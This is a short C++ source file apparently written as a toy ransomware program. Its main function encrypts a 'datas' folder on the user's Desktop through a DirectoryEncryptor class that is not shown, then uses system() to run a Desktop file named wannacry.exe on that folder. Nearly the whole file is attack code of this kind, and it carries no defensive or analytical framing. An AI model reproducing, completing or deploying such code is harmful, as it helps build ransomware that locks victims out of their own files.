#include "DirectoryEncryption.h"
#include <iostream>
#include <string>
#include <sys/stat.h>

// Function to check if a file exists
bool fileExists(const std::string &filePath) {
    struct stat buffer;
    return (stat(filePath.c_str(), &buffer) == 0);
}

int main() {
    PlatformGreeting platformGreeting;
    DirectoryEncryptor directoryEncryptor;

    // Get the home directory
    std::string homeDirectory = platformGreeting.getHomeDirectory();

    // Construct the path to the encryption directory on the desktop
    std::string pathSeparator = platformGreeting.getPathSeparator();
    std::string encryptionDirectory = homeDirectory + pathSeparator + "Desktop" +
                                      pathSeparator + "datas";

    // Encrypt the directory
    directoryEncryptor.encrypt(encryptionDirectory);

    // Construct the path to the wannacry.exe file
    std::string wannacryPath = homeDirectory + pathSeparator + "Desktop" +
                               pathSeparator + "wannacry.exe";

    // Check if wannacry.exe exists
    if (fileExists(wannacryPath)) {
        // Run the wannacry.exe file
        std::string command = wannacryPath + " " + encryptionDirectory;
        int result = system(command.c_str());
    } else {
        std::cout << "wannacry.exe does not exist. Continuing without running it." << std::endl;
    }

    return 0;
}
